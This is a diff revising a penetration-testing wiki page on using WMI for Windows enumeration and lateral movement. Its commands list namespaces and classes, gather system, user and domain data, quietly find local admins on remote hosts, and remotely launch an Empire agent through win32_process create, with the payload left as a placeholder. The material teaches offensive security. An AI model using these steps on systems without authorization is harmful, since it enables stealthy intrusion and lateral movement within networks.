@@ -14,107 +14,97 @@ Other ways to support HackTricks:
 
 </details>
 
-## How Does it works
+## How It Works Explained
 
-Wmi allows to open process in hosts where you know username/(password/Hash). Then, Wmiexec uses wmi to execute each command that is asked to execute (this is why Wmicexec gives you semi-interactive shell).
+Processes can be opened on hosts where the username and either password or hash are known through the use of WMI. Commands are executed using WMI by Wmiexec, providing a semi-interactive shell experience.
 
-**dcomexec.py:** This script gives a semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints (ShellBrowserWindow DCOM object). Currently, it supports MMC20. Application, Shell Windows and Shell Browser Window objects. (from [here](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** Utilizing different DCOM endpoints, this script offers a semi-interactive shell akin to wmiexec.py, specifically leveraging the ShellBrowserWindow DCOM object. It currently supports MMC20. Application, Shell Windows, and Shell Browser Window objects. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
-## WMI Basics
+## WMI Fundamentals
 
 ### Namespace
 
-WMI is divided into a directory-style hierarchy, the \root container, with other directories under \root. These "directory paths" are called namespaces.\
-List namespaces:
+Structured in a directory-style hierarchy, WMI's top-level container is \root, under which additional directories, referred to as namespaces, are organized.
+Commands to list namespaces:
 
 ```bash
-#Get Root namespaces
+# Retrieval of Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
 
-#List all namespaces (you may need administrator to list all of them)
+# Enumeration of all namespaces (administrator privileges may be required)
 Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 
-#List namespaces inside "root\cimv2"
+# Listing of namespaces within "root\cimv2"
 Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 ```
 
-List classes of a namespace with:
+Classes within a namespace can be listed using:
 
 ```bash
-gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
+gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
 gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 
 ### **Classes**
 
-The WMI class name eg: win32\_process is a starting point for any WMI action. We always need to know a Class Name and the Namespace where it is located.\
-List classes starting with `win32`:
+Knowing a WMI class name, such as win32\_process, and the namespace it resides in is crucial for any WMI operation.
+Commands to list classes beginning with `win32`:
 
 ```bash
-Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
+Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
 ```
 
-Call a class:
+Invocation of a class:
 
 ```bash
-#When you don't specify a namespaces by default is "root/cimv2"
+# Defaults to "root/cimv2" when namespace isn't specified
 Get-WmiObject -Class win32_share
 Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
 ```
 
 ### Methods
 
-WMI classes have one or more functions that can be executed. These functions are called methods.
+Methods, which are one or more executable functions of WMI classes, can be executed.
 
 ```bash
-#Load a class using [wmiclass], leist methods and call one
+# Class loading, method listing, and execution
 $c = [wmiclass]"win32_share"
 $c.methods
-#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
-$c.Create("c:\share\path","name",0,$null,"My Description")
-#If returned value is "0", then it was successfully executed
+# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
 ```
 
 ```bash
-#List methods
-Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
-#Call create method from win32_share class
+# Method listing and invocation
 Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
 ```
 
 ## WMI Enumeration
 
-### Check WMI service
+### WMI Service Status
 
-This how you can check if WMI service is running:
+Commands to verify if the WMI service is operational:
 
 ```bash
-#Check if WMI service is running
+# WMI service status check
 Get-Service Winmgmt
-Status   Name               DisplayName
-------   ----               -----------
-Running  Winmgmt            Windows Management Instrumentation
 
-#From CMD
+# Via CMD
 net start | findstr "Instrumentation"
 ```
 
-### System Information
+### System and Process Information
+
+Gathering system and process information through WMI:
 
 ```bash
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
-```
-
-### Process Information
-
-```bash
 Get-WmiObject win32_process | Select Name, Processid
 ```
 
-From an attacker's perspective, WMI can be very valuable in enumerating sensitive information about a system or the domain.
+For attackers, WMI is a potent tool for enumerating sensitive data about systems or domains.
 
-```
+```bash
 wmic computerystem list full /format:list  
 wmic process list /format:list  
 wmic ntdomain list /format:list  
@@ -123,41 +113,23 @@ wmic group list /format:list
 wmic sysaccount list /format:list  
 ```
 
-```bash
- Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
-```
+Remote querying of WMI for specific information, such as local admins or logged-on users, is feasible with careful command construction.
 
-## **Manual Remote WMI Querying**
+### **Manual Remote WMI Querying**
 
-For example, here's a very stealthy way to discover local admins on a remote machine (note that domain is the computer name):
+Stealthy identification of local admins on a remote machine and logged-on users can be achieved through specific WMI queries. `wmic` also supports reading from a text file to execute commands on multiple nodes simultaneously.
 
-{% code overflow="wrap" %}
-```bash
-wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
-```
-{% endcode %}
-
-Another useful oneliner is to see who is logged on to a machine (for when you're hunting admins):
+To remotely execute a process over WMI, such as deploying an Empire agent, the following command structure is employed, with successful execution indicated by a return value of "0":
 
 ```bash
-wmic /node:ordws01 path win32_loggedonuser get antecedent  
+wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
 
-`wmic` can even read nodes from a text file and execute the command on all of them. If you have a text file of workstations:
+This process illustrates WMI's capability for remote execution and system enumeration, highlighting its utility for both system administration and penetration testing.
 
-```
-wmic /node:@workstations.txt path win32_loggedonuser get antecedent  
-```
 
-**We'll remotely create a process over WMI to execute a Empire agent:**
-
-```bash
-wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
-```
-
-We see it executed successfully (ReturnValue = 0). And a second later our Empire listener catches it. Note the process ID is the same as WMI returned.
-
-All this information was extracted from here: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+# References
+* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 ## Automatic Tools
 
